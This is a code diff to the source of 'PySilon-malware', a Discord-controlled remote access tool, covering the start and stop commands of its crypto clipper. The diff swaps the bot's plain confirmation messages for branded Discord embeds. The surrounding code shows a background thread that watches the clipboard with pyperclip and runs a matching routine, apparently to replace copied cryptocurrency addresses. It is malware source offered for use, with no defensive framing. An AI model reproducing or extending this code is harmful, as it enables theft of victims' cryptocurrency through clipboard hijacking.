@@ -7,7 +7,9 @@ import threading
 
 # on message
 elif message.content == '.start-clipper':
-    await message.channel.send("`Crypto Clipper started.`")
+    embed = discord.Embed(title="🟢 Crypto Clipper started!",description=f'```Crypto Clipper has been started! Stop it by using .stop-clipper```', colour=discord.Colour.green())
+    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+    await message.channel.send(embed=embed)
     clipper_stop = False
     script_dir = os.path.dirname(os.path.abspath(__file__))
     config_path = os.path.join(script_dir, 'crypto_clipper.json')
@@ -38,12 +40,13 @@ elif message.content == '.start-clipper':
             pyperclip.waitForNewPaste()
             match()
 
-    # Start thread
     thread = threading.Thread(target=wait_for_paste)
     thread.start()
 
 # on message
 elif message.content == '.stop-clipper':
-    await message.channel.send("`Crypto Clipper stopped.`")
+    embed = discord.Embed(title="🔴 Crypto Clipper stopped!",description=f'```Crypto Clipper has been stopped! Start it using .start-clipper```', colour=discord.Colour.red())
+    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+    await message.channel.send(embed=embed)
     clipper_stop = True
     thread.join()
